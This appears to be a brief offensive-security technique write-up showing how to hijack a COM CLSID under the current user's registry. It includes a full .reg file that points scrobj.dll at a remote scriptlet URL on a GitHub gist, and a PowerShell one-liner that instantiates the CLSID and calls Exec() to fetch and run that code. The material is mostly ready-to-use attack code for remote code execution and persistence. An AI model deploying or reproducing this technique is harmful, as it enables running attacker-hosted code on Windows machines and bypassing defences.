### Author Matt harr0ey 

Synopsis: This method grants you the right to access and the execute via Activator.System .NET to connection with Scriptlet through a CLSID

![131231](https://user-images.githubusercontent.com/25440152/48066324-f0db7d00-e1d5-11e8-8bb6-efa03b4c4a7c.PNG)

![312313123123131](https://user-images.githubusercontent.com/25440152/48066255-c25da200-e1d5-11e8-9ad5-6129775e5646.PNG)

```
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Classes\CLSID\{00020000-0000-0000-C000-000000000046}]
@="Bandit"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{00020000-0000-0000-C000-000000000046}\InprocServer32]
@="C:\\WINDOWS\\system32\\scrobj.dll"
"ThreadingModel"="Apartment"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{00020000-0000-0000-C000-000000000046}\ProgID]
@="Bandit"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{00020000-0000-0000-C000-000000000046}\ScriptletURL]
@="https://gist.githubusercontent.com/homjxi0e/3e4488789a6b9222e445a68d29962518/raw/a167f0f680b446be17fa6a898b865b0056dfb072/COMobj.sct"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{00020000-0000-0000-C000-000000000046}\VersionIndependentProgID]
@="Bandit"

```
```
$1=[Activator]::CreateInstance([type]::GetTypeFromCLSID("{00020000-0000-0000-C000-000000000046}"));
$1.Exec();
```
